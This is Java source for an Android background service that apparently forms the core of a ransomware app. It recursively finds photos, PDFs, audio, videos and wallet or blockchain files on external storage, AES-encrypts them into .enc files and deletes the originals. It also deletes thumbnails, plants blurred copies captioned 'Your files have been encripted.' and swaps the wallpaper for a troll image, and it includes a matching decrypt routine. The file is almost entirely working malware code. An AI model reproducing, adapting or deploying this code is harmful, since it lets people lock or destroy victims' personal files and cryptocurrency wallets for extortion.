package alepacheco.com.rw.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;

import alepacheco.com.rw.activityes.DecryptActivity;
import alepacheco.com.rw.R;
import alepacheco.com.rw.activityes.HappyActivity;
import alepacheco.com.rw.apl.Aes;
import alepacheco.com.rw.apl.BlurBuilder;
import alepacheco.com.rw.apl.Helper;
import alepacheco.com.rw.io.IO;
import alepacheco.com.rw.persistence.LocalStorage;

public class MyService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    List<File> al, vids;
    int progress = 0;
    String totalFiles = "";
    String idUser;
    byte[] KEY;
    Random r;
    Context ctx;

    @Override
    public void onCreate() {
        super.onCreate();
        initialize();
    }

    protected void initialize(){
        ctx = getApplicationContext();
        r = new Random();

        al = getFiles(Environment.getExternalStorageDirectory(),
                new String[]{
                        ".jpg", ".jpeg", ".png", ".JPG", ".PNG",
                        ".JPEG", ".pdf", ".PDF", ".mp3", ".MP3",
                        ".WAV", ".wav",
                        "wallet", "blockchain", ".ogg", ".thumbnails"},
                new String[]{"Android/data"});
        vids = getFiles(Environment.getExternalStorageDirectory(),
                new String[]{
                        ".mp4", ".MP4", ".avi", ".AVI", ".mov", ".MOV", ".mkv", ".MKV"},
                new String[]{"Android/data"});

        totalFiles = String.valueOf(al.size()) + " And " + String.valueOf(vids.size());
    }

    protected void openHappyActivity(){
        Helper.changeWallPaper(ctx,R.drawable.happy);
        startActivity(new Intent(ctx, HappyActivity.class));
    }

    protected void openDecryptActivity(){
        startActivity(new Intent(ctx, DecryptActivity.class));
    }

    /*
    * Check if the key typed is correct
    * DEACTIVATED
    * */
    private Boolean checkTypedKey(){
        String typedKey = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_TEMP_KEY);
        String currentKey = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_KEY);
        return currentKey.equals(typedKey);
    }

    /*
    * Check encrypted state
    * @returns True -> Enctypted
    * @returns False -> Decrypted
    * */
    protected Boolean checkEncryptedState(){
        return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_ENCRYPTED);
    }

    /*
    * Save encrypted state on Local Storage
    * */
    protected void saveEncryptedState(){
        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED,true);
    }

    /*
    * Save decrypted state on Local Storage
    * */
    protected void saveDecryptedState(){
        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED,false);
    }

    /*
    * Generate and save Random ID
    * */
    protected void generateRandomId() {
        Long hex = r.nextLong();
        String id = Long.toHexString(hex);
        id = new String(id.getBytes());
        Date d = new Date();
        this.idUser = String.format("%s-%s",d.getTime(),id);
        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ID_USER,idUser);
    }

    /*
    * Generate and save Random key
    * */
    protected void generateRandomKey(){
        Long hex = r.nextLong();
        String key = Long.toHexString(hex);
        this.KEY = key.getBytes();
        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,key);
    }

    public void updateProgress(boolean direction) {
        if (direction) {
            progress = progress + 1;
        } else {
            progress = progress - 1;
        }
        System.out.println(String.valueOf(progress) + "/" + totalFiles);
    }

    public void encryptFile() throws Exception {
        Helper.makeToast(ctx,"Pics");
        for (File file : al) {
            if (file.getPath().contains(".thumbnails")) {
                file.delete();
                updateProgress(true);
            } else if (!file.getPath().contains("IMPORTANT.jpg") && !file.getPath().contains(".enc") && !file.getPath().contains("brld_")) {
                // 1 in N
                if (new Random().nextInt(20) == 0) {
                    byte[] brld = blurPhoto(file);
                    saveFile(brld, file.getParentFile().getPath() + File.separator + "brld_" + file.getName());
                }
                Log.v("Crypt file", file.getPath());
                byte[] enc = Aes.encrypt(KEY, fullyReadFileToBytes(file));
                saveFile(enc, file.getPath() + ".enc");

                file.delete();
                updateProgress(true);
            }
        }
        Helper.makeToast(ctx,"Vids");
        for (File vid : vids) {
            if (!vid.getPath().contains(".enc")){
                Aes.encryptLarge(KEY, vid, new File(vid.getPath()+".enc"));
            }
        }


        Bitmap bm = BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher);
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.PNG, 100, stream);
        saveFile(stream.toByteArray(), Environment.getExternalStorageDirectory() + File.separator + "Pictures" );

        Helper.changeWallPaper(ctx,R.drawable.troll);
        Helper.makeToast(ctx,"Done");

    }

    public void decryptFile() throws Exception {
        for (File file : al) {
            Log.v("FILE",file.getPath());
            if (file.getPath().contains(".thumbnails") || file.getPath().contains("brld")) {
                file.delete();
            } else if (file.getPath().contains(".enc") && !file.getPath().contains(".enc.enc") && !file.getPath().contains("brld")) {
                //Decrypt
                byte[] in = fullyReadFileToBytes(file);
                byte[] dec = Aes.decrypt(KEY, in);
                saveFile(dec, file.getPath().substring(0, file.getPath().length() - 4));
                file.delete();
            }
            updateProgress(false);
        }

        for (File vid : vids) {
            if (vid.getPath().contains(".enc") && !vid.getPath().contains(".enc.enc")) {
                Aes.decryptLarge(KEY, vid, new File(vid.getPath().substring(0, vid.getPath().length() - 4)));
            }
        }

        Helper.makeToast(ctx,"Decrypted... i guess :D");
    }

    byte[] fullyReadFileToBytes(File f) throws IOException {
        int size = (int) f.length();
        byte bytes[] = new byte[size];
        byte tmpBuff[] = new byte[size];
        FileInputStream fis = new FileInputStream(f);
        try {

            int read = fis.read(bytes, 0, size);
            if (read < size) {
                int remain = size - read;
                while (remain > 0) {
                    read = fis.read(tmpBuff, 0, remain);
                    System.arraycopy(tmpBuff, 0, bytes, size - remain, read);
                    remain -= read;
                }
            }
        } catch (IOException e) {
            throw e;
        } finally {
            fis.close();
        }

        return bytes;
    }

    public void saveFile(byte[] data, String outFileName) {
        try {
            FileOutputStream fos = new FileOutputStream(outFileName);
            fos.write(data);
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    List<File> getFiles(File parentDir, String[] toFind, String[] exclude) {
        ArrayList<File> inFiles = new ArrayList<File>();
        File[] files = parentDir.listFiles();
        for (File file : files) {
            if (file.isDirectory()) {
                inFiles.addAll(getFiles(file, toFind, exclude));
            } else {
                boolean append = false;
                for (String s : toFind) {
                    if (file.getPath().contains(s)) {
                        append = true;
                        break;
                    }
                }
                for (String ex : exclude) {
                    if (file.getPath().contains(ex)) {
                        append = false;
                        break;
                    }
                }

                if (append) {
                    inFiles.add(file);
                }
            }
        }
        return inFiles;
    }

    public byte[] blurPhoto(File file) {
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inPreferredConfig = Bitmap.Config.ARGB_8888;
        options.inJustDecodeBounds = false;
        Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath(), options);
        if (bitmap == null) {
            return null;
        }
        Bitmap blurredBitmap = BlurBuilder.blur(this, bitmap);
        Bitmap textedBm = drawMultilineTextToBitmap(blurredBitmap, "Your files have been encripted.");


        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        textedBm.compress(Bitmap.CompressFormat.PNG, 100, stream);
        return stream.toByteArray();

    }

    public void cleanPhotos() {
        for (File file : al) {
            if (BitmapFactory.decodeFile(file.getAbsolutePath()) == null) {
                file.delete();
            }
            updateProgress(true);
        }

    }

    public Bitmap drawMultilineTextToBitmap(Bitmap bitmap, String gText) {
        int scale = 1;
        android.graphics.Bitmap.Config bitmapConfig = bitmap.getConfig();
        // set default bitmap config if none
        if (bitmapConfig == null) {
            bitmapConfig = android.graphics.Bitmap.Config.ARGB_8888;
        }
        // resource bitmaps are imutable,
        // so we need to convert it to mutable one
        bitmap = bitmap.copy(bitmapConfig, true);

        Canvas canvas = new Canvas(bitmap);

        // new antialiased Paint
        TextPaint paint = new TextPaint(Paint.ANTI_ALIAS_FLAG);
        // text color - #3D3D3D
        paint.setColor(Color.rgb(61, 61, 61));
        // text size in pixels
        paint.setTextSize(14 * scale);
        // text shadow
        paint.setShadowLayer(1f, 0f, 1f, Color.WHITE);

        // set text width to canvas width minus 16dp padding
        int textWidth = canvas.getWidth() - 16 * scale;

        // init StaticLayout for text
        StaticLayout textLayout = new StaticLayout(
                gText, paint, textWidth, Layout.Alignment.ALIGN_CENTER, 1.0f, 0.0f, false);

        // get height of multiline text
        int textHeight = textLayout.getHeight();

        // get position of text's top left corner
        float x = (bitmap.getWidth() - textWidth) / 2;
        float y = (bitmap.getHeight() - textHeight) / 2;

        // draw text to the Canvas center
        canvas.save();
        canvas.translate(x, y);
        textLayout.draw(canvas);
        canvas.restore();

        return bitmap;
    }
}
